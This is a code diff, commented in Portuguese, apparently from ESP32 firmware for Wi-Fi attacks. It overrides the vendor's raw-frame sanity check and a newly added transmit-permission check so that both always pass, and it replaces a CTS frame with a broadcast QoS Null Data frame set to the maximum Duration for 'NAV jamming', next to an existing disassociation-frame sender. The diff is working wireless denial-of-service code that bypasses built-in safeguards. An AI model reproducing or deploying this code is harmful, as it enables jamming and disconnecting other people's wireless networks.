@@ -59,6 +59,16 @@ int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
     return 0;  /* sempre aprova — bypass completo */
 }
 
+/**
+ * ieee80211_is_tx_allowed — segunda barreira de filtragem de frames.
+ * Verifica se o tipo de frame (management, control, data) pode ser transmitido.
+ * Por padrão, pode bloquear frames de controle (CTS, RTS) em raw TX.
+ * Override retorna 1 (permitido) para todos os frame types.
+ */
+int ieee80211_is_tx_allowed(void) {
+    return 1;  /* sempre permite TX — bypass de control frames */
+}
+
 /* ─────────────────────────────────────────────────────────────────────────
  * TEMPLATES DE FRAME 802.11
  * ───────────────────────────────────────────────────────────────────────── */
@@ -99,16 +109,19 @@ static const uint8_t disassoc_frame_template[] = {
 };
 
 /**
- * Frame CTS Real (Clear To Send) (0xC4)
- * O uso de QoS Null Data não se provou efetivo contra todos os hardwares, 
- * pois muitos descartam o frame de dados sem ler o NAV.
- * Voltamos ao verdadeiro CTS (Control Frame). Para evitar o crash nativo,
- * fazemos o padding para 24 bytes.
+ * Frame QoS Null Data com Duration máximo para NAV jamming
+ * CTS (0xC4) não pode ser enviado via esp_wifi_80211_tx (control frame).
+ * QoS Null Data (0xC8) é management frame e passa pela API.
+ * Funciona na maioria dos chipsets que honram o campo Duration/NAV.
  */
-static const uint8_t cts_frame_template[] = {
-    0xc4, 0x00,                         /* Frame Control: CTS */
-    0xff, 0x7f,                         /* Duration: 32767 us (Max) */
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00  /* Receiver Address (RA) */
+static const uint8_t qos_null_frame_template[] = {
+    0xc8, 0x01,                         /* Frame Control: QoS Null Data */
+    0xff, 0x7f,                         /* Duration: 32767 us (Max NAV) */
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Addr1: RA (preenchido em runtime) */
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Addr2: SA (preenchido em runtime) */
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Addr3: BSSID (preenchido em runtime) */
+    0xf0, 0xff,                         /* Seq Control */
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  /* QoS Control + padding */
 };
 
 /* ─────────────────────────────────────────────────────────────────────────
@@ -226,20 +239,28 @@ void wsl_bypasser_send_disassoc_frame(const wifi_ap_record_t *ap_record) {
     _tx_with_fallback(frame, sizeof(frame));
 }
 
-void wsl_bypasser_send_cts_frame(const uint8_t *target_mac) {
-    if (!target_mac) return;
+esp_err_t wsl_bypasser_send_cts_frame(const uint8_t *target_mac) {
+    if (!target_mac) return ESP_ERR_INVALID_ARG;
 
-    // Buffer de 24 bytes para satisfazer a exigência da API nativa
-    uint8_t frame[24];
-    
-    // Copia os 10 bytes do template CTS original
-    memcpy(frame, cts_frame_template, sizeof(cts_frame_template));
-    
-    // Zera o restante do buffer (padding) para evitar vazamentos/crashes
-    memset(frame + sizeof(cts_frame_template), 0x00, sizeof(frame) - sizeof(cts_frame_template));
-    
-    // CTS só tem um endereço MAC: o RA (Receiver Address)
-    memcpy(&frame[4], target_mac, 6);
+    uint8_t frame[sizeof(qos_null_frame_template)];
+    memcpy(frame, qos_null_frame_template, sizeof(qos_null_frame_template));
 
-    _tx_with_fallback(frame, sizeof(frame));
+    // Addr1: RA = broadcast para todos ouvirem e setarem NAV
+    memset(&frame[4], 0xff, 6);
+    // Addr2: SA = MAC da interface (obrigatório para o driver transmitir)
+    uint8_t mac[6];
+    esp_wifi_get_mac(WIFI_IF_STA, mac);
+    memcpy(&frame[10], mac, 6);
+    // Addr3: BSSID = MAC da interface
+    memcpy(&frame[16], mac, 6);
+
+    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
+    if (ret != ESP_OK) {
+        ESP_LOGW(TAG, "NAV frame via AP falhou (0x%x), tentando STA", ret);
+        ret = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
+        if (ret != ESP_OK) {
+            ESP_LOGE(TAG, "NAV frame falhou em ambas: 0x%x", ret);
+        }
+    }
+    return ret;
 }
